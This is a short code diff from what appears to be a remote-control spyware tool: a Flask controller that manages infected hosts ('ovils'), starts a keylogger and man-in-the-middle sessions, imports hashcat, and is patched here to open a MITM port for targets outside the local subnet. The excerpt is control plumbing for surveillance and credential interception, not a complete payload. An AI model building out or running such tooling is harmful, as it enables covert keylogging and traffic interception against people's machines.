@@ -1,5 +1,7 @@
+import ipaddress
 from hashcat.runp import runp
 from multiprocessing import freeze_support
+from spying import Spy
 from spying.multyproc import Process
 import os
 import subprocess
@@ -15,7 +17,7 @@ from typing import Callable, List, Tuple
 from pathlib import Path
 from flask import Flask, render_template, send_file, request, abort, redirect, url_for, jsonify
 import time
-from network.consts import Massages, UPLOAD_DEFAULT_PATH
+from network.consts import Massages, UPLOAD_DEFAULT_PATH, MITM_DEFAULT_PORT
 from consts import *
 from network import check_ip
 from network.client import Client
@@ -222,6 +224,8 @@ def stop_dynamic_mitm(ip):
 
 
 def start_dynamicmitm(ip) -> str | bool:
+    if ipaddress.IPv4Address(ip) not in ipaddress.IPv4Network('192.168.0.0/24'):
+        Spy.open_port(MITM_DEFAULT_PORT)
     if ip not in ovils:
         return "Can't start KeyLogger on a disconnected ovil"
     i = ovils.index(ip)
